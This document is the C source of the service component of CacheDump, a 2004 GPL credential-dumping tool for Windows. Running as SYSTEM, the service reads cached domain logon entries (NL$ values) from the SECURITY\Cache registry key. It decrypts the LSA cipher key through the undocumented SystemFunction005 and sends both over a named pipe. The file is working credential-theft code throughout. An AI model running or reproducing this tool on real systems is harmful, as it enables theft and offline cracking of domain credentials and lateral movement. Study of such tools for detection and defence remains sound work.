/*
 *  Copyright (C) 2004  Arnaud Pilon
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

/**
 * CacheDump NT Service main body.
 * Ok, it's not very clean but should work most of the time.
 */
#include <windows.h>
#include <Winsvc.h>
#include <Winbase.h>
#include <WinReg.h>

#include <stdio.h>

#include "cacheDump.h"

TCHAR* SERVICE_NAME = TEXT( CACHE_DUMP_SERVICE_NAME );
char ErrorBuffer2[ BUFFER_SIZE ];
DWORD * threadHandle;
DWORD ErrorSize = BUFFER_SIZE;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
SERVICE_STATUS serviceStatus;
const char* szPipeName;

extern DWORD getCipherKey( BYTE *, HANDLE );

void KillService()
{
	serviceStatus.dwControlsAccepted &= ~( SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus( serviceStatusHandle, &serviceStatus );
}


VOID SendErrorMessage( HANDLE hPiped, CHAR * mess )
{
	sprintf( ErrorBuffer2, ERROR_MESSAGE, mess, GetLastError() );
	WriteFile( hPiped, ErrorBuffer2, ( DWORD ) ( strlen( ErrorBuffer2 ) + 1 ), &ErrorSize, NULL );
	FlushFileBuffers( hPiped );	
	DisconnectNamedPipe( hPiped );
	CloseHandle( hPiped );
	KillService();
	ExitThread( 1 );	
}


DWORD DumpLsaKey( HANDLE hPiped )
{
	PSystemFunction005 SystemFunction005 = NULL;
	HKEY hKey;
	DWORD size, type;
	LSA_UNICODE_STRING2 lsaCurrVal;
	LSA_UNICODE_STRING2 lsaSecret;
	LSA_UNICODE_STRING2 lsaData = { 0, 0, NULL };
	BYTE buffer[ BUFFER_SIZE ];
	BYTE cipherKey[ 0x10 ];
	HMODULE hAdvapi32;

	if ( ( hAdvapi32 = LoadLibrary( "advapi32.dll" ) ) == NULL ) {
		SendErrorMessage( hPiped, "Failed to load LoadLibrary advapi32.dll" );
	}

	SystemFunction005 = ( PSystemFunction005 ) GetProcAddress( hAdvapi32, "SystemFunction005" );
	if ( SystemFunction005 == NULL ) {
		SendErrorMessage( hPiped, "Failed to GetProcAddress SystemFunction005" );
	}


	//  key invalidate by default
	memset(cipherKey, 0, 0x10);

	if ( getCipherKey( cipherKey, hPiped ) <= 0 ) {
		SendErrorMessage( hPiped, "Failed to retrieved LSA Cipher key" );
	}

	lsaSecret.Buffer = (BYTE *) cipherKey;
	lsaSecret.Length = 0x10;
	lsaSecret.MaximumLength = lsaSecret.Length;


	if ( RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_LSA_CIPHER_KEY, 0, KEY_READ, &hKey )
			!= ERROR_SUCCESS ) {
		SendErrorMessage( hPiped, "Failed to retrieve LSA Cipher Key by RegOpenKeyEx" );
	}

	size = sizeof( buffer );
	if ( RegQueryValueEx(hKey, "", NULL, &type, ( LPBYTE ) buffer, &size )
		!= ERROR_SUCCESS ) {
		SendErrorMessage( hPiped, "Failed to retrieve LSA Cipher Key value RegQueryValue" );
	}

	lsaCurrVal.Buffer = ( BYTE * ) buffer + 0xC;  
	lsaCurrVal.Length = size - 0xC;
	lsaCurrVal.MaximumLength = lsaCurrVal.Length;
			
	SystemFunction005( &lsaCurrVal, &lsaSecret, &lsaData );
 			
	lsaData.Buffer = ( BYTE * ) malloc( lsaData.Length );
	memset( lsaData.Buffer, 0, lsaData.Length );
	lsaData.MaximumLength = lsaData.Length;
			
	SystemFunction005( &lsaCurrVal, &lsaSecret, &lsaData );
 
	if ( lsaData.Length == 0 ||lsaData.Buffer == NULL ) {
		SendErrorMessage( hPiped, "Can't compute LSA Cipher Key SystemFunction005" );
	}

	sprintf( (char*)buffer, "LSA" );
	memcpy( buffer + 3, lsaData.Buffer, lsaData.Length );

	if ( !WriteFile( hPiped, buffer, lsaData.Length + 3, &size, NULL ) ) {
		SendErrorMessage( hPiped, "Failed to send LSA Cipher Key WriteFile" );
	}

	FlushFileBuffers(hPiped);
 
	return 0;
}


DWORD ServiceExecutionThread( LPDWORD argv )
{
	HKEY hKey;

	BYTE data[ BUFFER_SIZE ];
	DWORD size = BUFFER_SIZE;
	DWORD type;
	HANDLE hPiped;
	LONG ret;
	DWORD nbWrite;
	int i;
 
	if ( !WaitNamedPipe( szPipeName, CD_TIMEOUT ) ) {
		// No pipe available
		goto end;
	}

	// should work. If not, prog crash.
	if ( ( hPiped = CreateFile( szPipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ) )
					== INVALID_HANDLE_VALUE ) {
		goto end;
	}

	if ( ( ret = RegOpenKeyEx( HKEY_LOCAL_MACHINE, REG_SECURITY_CACHE, 0, KEY_READ, &hKey ) )
					!= ERROR_SUCCESS ) {
		SendErrorMessage( hPiped, "Failed to open key SECURITY\\Cache in RegOpenKeyEx."
				" Is service running as SYSTEM ? Do you ever log on domain ? " );
	}

	if ( ( ret = RegQueryValueEx( hKey , REG_CACHE_CONTROL, NULL, &type, data, &size ) )
					== ERROR_SUCCESS ) {
		if ( !!strncmp( (char*)data, "\x04\x00\x01\x00", 4 ) ) {
            SendErrorMessage( hPiped, "Incorrect MSV Version (only v1.4 supported)" );
        }
	} else {
		// SendErrorMessage( hPiped, "Failed to retrieve MSV version in RegQueryValueEx" );
	}

	for ( i = 1 ; i <= MAX_CACHE_ENTRIES ; i++ ) {
		TCHAR NLn[ 6 ];
		sprintf( NLn, "NL$%d", i );
		size = BUFFER_SIZE;
 
		if ( ( ret = RegQueryValueEx( hKey , NLn, NULL, &type, data, &size ) ) == ERROR_SUCCESS ) {
			BYTE localBuffer[ BUFFER_SIZE ];
			sprintf( (char*)localBuffer, "NLK" );
			memcpy( localBuffer + 3, data, size );
			WriteFile( hPiped, localBuffer, size + 3, &nbWrite, NULL );
			FlushFileBuffers(hPiped);
		} else {
			break;
		}
	}

	DumpLsaKey( hPiped );

end:
	FlushFileBuffers( hPiped );
	DisconnectNamedPipe( hPiped );
	CloseHandle( hPiped );

	KillService();

	return 0;
}


static BOOL StartServiceThread()
{
	DWORD id;

	return ( CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ServiceExecutionThread,
					0, 0, &id) != NULL );
}


VOID WINAPI ServiceCtrlHandler( DWORD controlCode )
{
	switch(controlCode)
	{
		case SERVICE_CONTROL_PAUSE:
			break;
		case SERVICE_CONTROL_CONTINUE:
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
		case SERVICE_CONTROL_SHUTDOWN:
		case SERVICE_CONTROL_STOP:
			serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
			SetServiceStatus( serviceStatusHandle, &serviceStatus );
			KillService();
			return;
		default:
			break;
	}

	SetServiceStatus( serviceStatusHandle, &serviceStatus );  
}



VOID WINAPI ServiceMain( DWORD argc , TCHAR ** argv )
{
    szPipeName = argv[1];

	serviceStatus.dwServiceType = SERVICE_WIN32;
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = 0;
    serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;
	serviceStatus.dwWin32ExitCode = NO_ERROR;

	serviceStatusHandle = RegisterServiceCtrlHandler( SERVICE_NAME, ServiceCtrlHandler );
	if ( serviceStatusHandle == 0 ) {
		return;
	}
 
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	SetServiceStatus( serviceStatusHandle, &serviceStatus );

	serviceStatus.dwControlsAccepted |= ( SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN );
	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus( serviceStatusHandle, &serviceStatus );


	StartServiceThread();
}
